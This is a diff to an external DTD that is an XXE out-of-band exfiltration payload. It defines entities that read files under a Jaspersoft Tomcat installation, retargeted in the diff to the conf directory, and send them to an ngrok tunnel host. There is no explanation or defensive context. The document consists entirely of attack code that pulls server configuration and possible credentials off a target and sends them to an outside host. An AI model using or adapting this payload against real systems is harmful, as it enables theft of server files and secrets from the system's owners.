@@ -1,4 +1,4 @@
 <!ENTITY % start "<[CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % outfile SYSTEM "file:///Jaspersoft/tomcat-server-8.0">
+<!ENTITY % outfile SYSTEM "file:///Jaspersoft/tomcat-server-8.0/conf">
 <!ENTITY % goout "<!ENTITY &#37; ftp SYSTEM '6.tcp.ngrok.io:14042/%start;%outfile;%end;'>">
